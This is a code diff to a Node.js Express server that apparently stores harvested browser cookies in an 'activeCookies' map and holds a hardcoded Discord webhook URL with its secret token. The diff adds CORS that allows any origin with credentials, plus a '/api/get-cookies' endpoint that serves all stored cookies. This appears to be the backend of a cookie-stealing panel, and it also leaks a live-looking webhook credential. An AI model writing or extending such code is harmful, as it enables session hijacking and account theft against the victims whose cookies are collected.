@@ -3,6 +3,7 @@ const axios = require('axios');
 const cookieParser = require('cookie-parser');
 const WebSocket = require('ws');
 const http = require('http');
+const cors = require('cors');
 
 // Discord webhook URL
 const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1377683745041154229/hem_TvDKnw1xhxttS0M6226ZOuVhIeJ60vZtmBD1M_nOAMTE8Vn8a6KHVvibHmtT7RPc';
@@ -10,6 +11,14 @@ const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/137768374504115422
 const app = express();
 const server = http.createServer(app);
 const wss = new WebSocket.Server({ server });
+
+// Configure CORS to allow all origins
+app.use(cors({
+    origin: true, // Allow all origins
+    credentials: true, // Allow credentials
+    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
+    allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With']
+}));
 
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
@@ -866,6 +875,14 @@ app.delete('/api/remove-cookie/:id', (req, res) => {
 
 app.get('/api/cookies', (req, res) => {
     res.json(Array.from(activeCookies.values()));
+});
+
+// Add get-cookies endpoint for better compatibility
+app.get('/api/get-cookies', (req, res) => {
+    res.json({
+        success: true,
+        cookies: Array.from(activeCookies.values())
+    });
 });
 
 const PORT = process.env.PORT || 5000;
